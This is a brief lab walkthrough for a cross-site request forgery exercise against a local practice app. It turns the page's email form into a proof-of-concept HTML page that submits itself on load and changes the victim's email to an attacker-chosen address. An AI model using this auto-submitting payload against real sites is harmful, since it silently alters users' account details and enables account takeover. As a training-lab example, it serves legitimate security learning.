Find `form` in web response to build a POC from there.

From
```
<form action="/labs/csrf0x01.php" method="post">
	<div class="mb-3 form-group">
		<label for="email">Email</label>
		<input type="text" name="email" class="form-control" id="email" aria-describedby="emailHelp"
			placeholder="Enter email">
	</div>
	<div class="mb-3">
		<button type="submit" class="btn btn-primary">Submit</button>
	</div>
</form>
```

To:
```
<html>
<body>

<form action="http://localhost/labs/csrf0x01.php" method="post">

<input type="text" name="email" value="csrf@mail.com">
<button type="submit">Submit</button>

</form>

<script>
window.onload = function() {
        document.forms[0].submit();
}
</script>

</body>
</html>
```